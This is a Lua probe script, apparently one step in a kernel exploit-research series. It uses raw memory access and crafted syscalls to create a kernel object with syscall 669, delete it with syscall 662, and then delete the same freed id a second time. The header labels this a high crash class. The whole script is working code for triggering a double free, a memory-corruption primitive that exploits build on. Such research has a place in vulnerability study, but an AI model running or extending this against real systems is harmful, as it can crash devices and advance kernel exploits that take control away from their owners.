-- CRASH_CLASS: HIGH
-- PROBE 488d: delete a live object created by 669
-- 488c produced real ids (out[0] increments per call). Feed one back into 662:
-- the 13.60 delete body resolves the id, drops the lock and frees the object.
-- A status of 0 instead of 0x80020003 means the object was found and deleted.
print("=== PROBE 488d: create then delete a live object ===")
io.stdout:setvbuf("no")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(buf, n)
    local o = {}
    for i = 0, n - 1 do
        local ok, b = pcall(function() return to_num(memory.read_byte(buf + i)) end)
        if not ok then o[#o + 1] = "??"; break end
        o[#o + 1] = string.format("%02x", b)
    end
    return table.concat(o, " ")
end
local data = memory.alloc(0x2000)
local out  = memory.alloc(0x100)
local ids  = memory.alloc(0x100)
local res  = memory.alloc(0x400)
for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
for off = 0, 0x400 - 1, 4 do pcall(function() memory.write_dword(res + off, 0x42424242) end) end
local sc669 = make_syscall(669)
local sc662 = make_syscall(662)

local function create()
  for off = 0, 0x100 - 1, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local ok, rv = pcall(function() return sc669(uint64(1), uint64(data), uint64(4), uint64(1), uint64(out)) end)
  if not ok then return nil, "-" end
  return to_num(memory.read_dword(out)), to_num(rv)
end

local id, rv = create()
print(string.format("[1] create ret=%d id=%d (%#x)", rv, id or -1, id or 0))
if not id or id <= 0 then print("=== abort: no id ===") return end

pcall(function() memory.write_dword(ids, id) end)
local ok2, rv2 = pcall(function() return sc662(uint64(ids), uint64(1), uint64(res)) end)
print(string.format("[2] delete ok=%s ret=%s", tostring(ok2), ok2 and tostring(to_num(rv2)) or "-"))
print("[2] res = " .. hex(res, 0x10))

print("[3] second delete of the same id (already-free object)")
local ok3, rv3 = pcall(function() return sc662(uint64(ids), uint64(1), uint64(res)) end)
print(string.format("[3] ret=%s res=%s", ok3 and tostring(to_num(rv3)) or "-", hex(res, 0x10)))
print("=== PROBE 488d COMPLETE ===")
